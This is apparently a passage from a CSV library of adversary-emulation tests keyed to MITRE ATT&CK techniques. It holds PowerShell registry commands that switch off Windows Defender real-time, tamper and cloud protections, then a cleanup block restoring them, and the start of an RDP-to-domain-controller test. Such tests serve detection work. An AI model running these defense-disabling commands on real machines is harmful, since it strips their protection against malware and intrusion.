+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIOAVProtection"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableOnAccessProtection"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRealtimeMonitoring"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRoutinelyTakingAction"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScanOnRealtimeEnable"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScriptScanning"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting"" -Name ""DisableEnhancedNotifications"" -Value 1  
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""DisableBlockAtFirstSeen"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""SpynetReporting"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine"" -Name ""MpEnablePus"" -Value 0 
+Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" -Name ""DisallowExploitProtectionOverride"" -Value 0 
+Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"" -Name ""TamperProtection""  -Value 0 
+Set-ItemProperty ""HKLM:\software\microsoft\windows defender\spynet"" -Name ""SubmitSamplesConsent"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Microsoft\Windows Defender"" -Name ""PUAProtection"" -Value 0 
+",powershell,True,,"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiVirus"" -Value 0
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableBehaviorMonitoring"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIntrusionPreventionSystem"" -Value 0
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIOAVProtection"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableOnAccessProtection"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRealtimeMonitoring"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRoutinelyTakingAction"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScanOnRealtimeEnable"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableScriptScanning"" -Value 0 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting"" -Name ""DisableEnhancedNotifications"" -Value 0  
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""DisableBlockAtFirstSeen"" -Value 0
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"" -Name ""SpynetReporting"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine"" -Name ""MpEnablePus"" -Value 1 
+Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" -Name ""DisallowExploitProtectionOverride"" -Value 1 
+Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"" -Name ""TamperProtection""  -Value 1
+Set-ItemProperty ""HKLM:\software\microsoft\windows defender\spynet"" -Name ""SubmitSamplesConsent"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Microsoft\Windows Defender"" -Name ""PUAProtection"" -Value 1 
 ",,,
 T1021.001,Remote Services: Remote Desktop Protocol,RDP to DomainController,355d4632-8cb9-449d-91ce-b566d0253d3e,"Attempt an RDP session via Remote Desktop Application to a DomainController.
 ",windows,,,"$Server=#{logonserver}
